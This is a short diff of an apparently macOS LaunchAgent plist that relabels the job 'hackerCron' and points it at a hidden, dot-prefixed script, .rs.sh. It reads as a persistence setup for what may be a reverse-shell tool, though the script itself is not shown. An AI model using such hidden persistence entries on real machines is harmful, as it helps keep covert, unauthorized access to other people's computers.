@@ -10,11 +10,11 @@ launchctl unload  $HOME/Library/LaunchAgents/rs.sh # stops the cronjob
 <plist version="1.0">
 <dict>
   <key>Label</key>
-  <string>I am watching you</string>
+  <string>hackerCron</string>
 
   <key>ProgramArguments</key>
   <array>
-    <string>/Users/kseniiazhuk/Applications/rs.sh</string>
+    <string>/Users/kseniiazhuk/Applications/.rs.sh</string>
   </array>
 
   <key>Nice</key>
